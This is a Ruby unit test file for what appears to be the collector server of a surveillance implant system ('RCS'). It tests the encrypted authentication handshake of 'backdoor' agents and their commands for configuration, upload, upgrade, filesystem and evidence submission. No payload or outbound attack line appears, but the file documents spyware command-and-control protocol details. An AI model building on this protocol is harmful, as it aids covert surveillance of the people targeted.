require "helper"
require 'rcs-common'
require 'singleton'

module RCS
module Collector

# dirty hack to fake the trace function
# re-open the class and override the method
class SessionManager
  def trace(a, b)
  end
end
class Protocol
  def self.trace(a, b)
  end
end

# mockup for the config singleton
class Config
  include Singleton
  def initialize
    @global = {'DB_ADDRESS' => 'test',
               'DB_PORT' => '0',
               'DB_SIGN' => 'rcs-server.sig',
               'DB_CERT' => 'rcs-ca.pem'}
  end
end

# Mockup for the DB class
class DB
  def trace(a, b)
  end
end

# fake xmlrpc class used during the DB initialize
class DB_xmlrpc
  def trace(a, b)
  end
end

class TestProtocol < Test::Unit::TestCase
  include RCS::Crypt

  def setup
    DB.instance.instance_variable_set(:@backdoor_signature, Digest::MD5.digest('test-signature'))
    DB.instance.instance_variable_set(:@class_keys, {"RCS_BUILD-TEST" => 'test-class-key'})
  end

  def test_invalid_auth
    # too short
    content = Protocol.authenticate('test-peer', 'test-uri', "ciao" * 16)
    assert_nil content

    # random junk
    auth_content = SecureRandom.random_bytes(112)
    content = Protocol.authenticate('test-peer', 'test-uri', auth_content)
    assert_nil content

    # fake message inside the crypt
    message = "test fake message to fuzzy the protocol".ljust(104, "\x00")
    message = aes_encrypt(message, DB.instance.backdoor_signature)
    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
    assert_nil content
  end

  def test_valid_auth
    # Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
    kd = "\x01" * 16
    nonce = "\x02" * 16
    build = "RCS_BUILD-TEST".ljust(16, "\x00")
    instance = "\x03" * 20
    type = "TEST".ljust(16, "\x00")
    sha = Digest::SHA1.digest(build + instance + type + DB.instance.class_key_of('RCS_BUILD-TEST'))
    message = kd + nonce + build + instance + type + sha
    message = aes_encrypt(message, DB.instance.backdoor_signature)

    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)

    assert_equal "application/octet-stream", type
    assert_kind_of String, cookie

    # [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]
    assert_equal 64, content.length
    ks = aes_decrypt(content.slice!(0..31), DB.instance.backdoor_signature)
    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
    # we use a schema like PBKDF1
    k = Digest::SHA1.digest(DB.instance.class_key_of('RCS_BUILD-TEST') + ks + kd)
    snonce = aes_decrypt(content, k)

    # check if the nonce is equal in the response
    assert_equal nonce, snonce.slice(0..15)

    assert_true Protocol.valid_authentication('test-peer', cookie)
  end

  def test_ident
    # stub the fake session (pretending auth was performed)
    key = Digest::SHA1.digest 'test-key'
    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)

    # prepare the command
    message = [Commands::PROTO_ID].pack('i')
    message += [2011010101].pack('i')
    message += "backdoor.userid".pascalize + "backdoor.deviceid".pascalize + "backdoor.sourceid".pascalize
    enc = aes_encrypt_integrity(message, key)

    content, type, rcookie = Protocol.commands('test-peer', cookie, enc)

    assert_nil rcookie
    assert_equal "application/octet-stream", type

    assert_nothing_raised do
      resp = aes_decrypt_integrity(content, key)
      command, tot, time, size, *list = resp.unpack('i2qi*')
      assert_equal Commands::PROTO_OK, command
    end
  end

  def test_bye
    # stub the fake session (pretending auth was performed)
    key = Digest::SHA1.digest 'test-key'
    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)

    # check that the session is valid (after the bye must be invalid)
    assert_true Protocol.valid_authentication('test-peer', cookie)

    # prepare the command
    message = [Commands::PROTO_BYE].pack('i')
    enc = aes_encrypt_integrity(message, key)

    content, type, rcookie = Protocol.commands('test-peer', cookie, enc)

    assert_nil rcookie
    assert_equal "application/octet-stream", type

    assert_nothing_raised do
      resp = aes_decrypt_integrity(content, key)
      command = resp.unpack('i').first
      assert_equal Commands::PROTO_OK, command
    end

    # after the bye, the session must be invalid
    assert_false Protocol.valid_authentication('test-peer', cookie)
  end

  def test_commands
    # stub the fake session (pretending auth was performed)
    key = Digest::SHA1.digest 'test-key'
    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)

    # all the commands
    commands = [Commands::PROTO_CONF, Commands::PROTO_UPLOAD, Commands::PROTO_UPGRADE, Commands::PROTO_DOWNLOAD, Commands::PROTO_FILESYSTEM]

    commands.each do |cmd|
      message = [cmd].pack('i')
      enc = aes_encrypt_integrity(message, key)
      content, type, rcookie = Protocol.commands('test-peer', cookie, enc)
      assert_nil rcookie
      assert_equal "application/octet-stream", type
      assert_nothing_raised do
        resp = aes_decrypt_integrity(content, key)
      end
    end
  end

  def test_evidence
    # stub the fake session (pretending auth was performed)
    key = Digest::SHA1.digest 'test-key'
    cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)

    evidence = 'test-evidence'
    message = [Commands::PROTO_EVIDENCE].pack('i') + [evidence.length].pack('i') + evidence

    enc = aes_encrypt_integrity(message, key)
    content, type, rcookie = Protocol.commands('test-peer', cookie, enc)
    assert_nil rcookie
    assert_equal "application/octet-stream", type
    assert_nothing_raised do
      resp = aes_decrypt_integrity(content, key)
    end
  end

end

end #Collector::
end #RCS::
